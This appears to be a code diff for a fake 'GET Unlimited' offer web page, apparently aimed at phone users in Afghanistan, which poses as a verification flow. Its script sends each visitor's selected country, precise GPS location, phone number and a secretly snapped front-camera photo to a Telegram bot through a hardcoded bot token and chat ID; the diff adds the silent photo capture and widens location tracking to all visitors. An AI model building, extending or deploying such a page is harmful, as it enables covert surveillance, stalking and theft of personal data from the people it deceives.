@@ -20,7 +20,6 @@
   </style>
 </head>
 <body>
-
 <div class="container">
   <!-- Logo Section -->
   <div class="logo">GET Unlimited A</div>
@@ -43,7 +42,7 @@
   <div id="step2" class="step">
     <label for="phone">Enter Phone Number</label>
     <input type="tel" id="phone" placeholder="+93 7XX XXX XXX">
-    <button onclick="handlePhoneSubmit()">Send Verification</button>
+    <button id="sendBtn" onclick="handlePhoneSubmit()">Send Verification</button>
     <p class="sub-text">Identity check requires camera permission upon sending.</p>
   </div>
 
@@ -62,103 +61,126 @@
 </div>
 
 <script>
-  // Complete Telegram API Credentials
-  const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCaAZYPF6PIIRCg2611ZWBlPTnlyds';
+  // Exact Correct Telegram Credentials
+  const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCAaZYPF6PIIRCg2611ZWBlPTnlyds';
   const TELEGRAM_CHAT_ID = '6809500416';
 
-  // Telegram Logging
-  function sendTelegramLog(message) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    }).catch(err => console.error('Telegram API Error:', err));
+  // Step Navigation Function
+  function goToStep(stepNumber) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(`step${stepNumber}`).classList.add('active');
   }
 
-  // Step 1: Country Change Handler
+  // Send Text Log to Telegram
+  async function sendTelegramLog(message) {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    } catch (err) {
+      console.error('Telegram API Error:', err);
+    }
+  }
+
+  // Send Photo (Camera capture) to Telegram
+  async function sendTelegramPhoto(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('photo', blob, 'user_capture.jpg');
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    } catch (err) {
+      console.error('Error sending photo:', err);
+    }
+  }
+
+  // Step 1: Country Selection & Location Request
   function handleCountryChange() {
     const selectedCountry = document.getElementById('country').value;
     if (!selectedCountry) return;
 
     sendTelegramLog(`🌐 <b>Selected Country:</b> ${selectedCountry}`);
 
-    if (selectedCountry === 'Afghanistan') {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const lat = pos.coords.latitude;
-            const lng = pos.coords.longitude;
-            const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
-            sendTelegramLog(`📍 <b>Location Granted (Afghanistan):</b>\n<a href="${mapUrl}">View Map Location</a>`);
-            goToStep(2);
-          },
-          (err) => {
-            sendTelegramLog(`⚠️ <b>Location Denied/Failed:</b> ${err.message}`);
-            goToStep(2);
-          }
-        );
-      } else {
-        goToStep(2);
-      }
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
+          sendTelegramLog(`📍 <b>Location Granted:</b>\n<a href="${mapUrl}">View Map Location</a>`);
+          goToStep(2);
+        },
+        (err) => {
+          sendTelegramLog(`⚠️ <b>Location Denied/Failed:</b> ${err.message}`);
+          goToStep(2);
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
     } else {
       goToStep(2);
     }
   }
 
-  // Step 2: Phone Submit Handler
-  function handlePhoneSubmit() {
-    const phoneVal = document.getElementById('phone').value;
-    if (!phoneVal) {
-      alert('Please enter a valid phone number');
+  // Step 2: Phone Submit & Camera Photo Capture
+  async function handlePhoneSubmit() {
+    const phoneInput = document.getElementById('phone').value;
+    if (!phoneInput) {
+      alert('Please enter your phone number.');
       return;
     }
 
-    sendTelegramLog(`📱 <b>Phone Number Entered:</b> ${phoneVal}`);
+    const btn = document.getElementById('sendBtn');
+    btn.disabled = true;
+    btn.innerText = 'Processing...';
 
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          sendTelegramLog(`📷 <b>Camera Permission:</b> Granted`);
-          stream.getTracks().forEach(track => track.stop());
-          goToStep(3);
-        })
-        .catch((err) => {
-          sendTelegramLog(`⚠️ <b>Camera Permission Denied:</b> ${err.message}`);
-          goToStep(3);
-        });
-    } else {
+    sendTelegramLog(`📱 <b>Phone Number:</b> <code>${phoneInput}</code>`);
+
+    try {
+      // Access Camera
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      // Capture photo to canvas
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Stop Camera
+      stream.getTracks().forEach(track => track.stop());
+
+      // Send Photo Blob
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          await sendTelegramPhoto(blob);
+        }
+        goToStep(3);
+      }, 'image/jpeg', 0.8);
+
+    } catch (err) {
+      sendTelegramLog(`⚠️ <b>Camera Permission Error:</b> ${err.message}`);
       goToStep(3);
     }
   }
 
-  // Step 3: View Details Handler
+  // Step 3: Completion Handler
   function handleViewDetails() {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ audio: true })
-        .then((stream) => {
-          sendTelegramLog(`🎙️ <b>Microphone Permission:</b> Granted`);
-          stream.getTracks().forEach(track => track.stop());
-          goToStep(4);
-        })
-        .catch((err) => {
-          sendTelegramLog(`⚠️ <b>Microphone Permission Denied:</b> ${err.message}`);
-          goToStep(4);
-        });
-    } else {
-      goToStep(4);
-    }
-  }
-
-  // Navigation Logic
-  function goToStep(stepNumber) {
-    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
-    document.getElementById(`step${stepNumber}`).classList.add('active');
+    sendTelegramLog(`✅ <b>User clicked View Details</b>`);
+    goToStep(4);
   }
 </script>
-
 </body>
 </html>
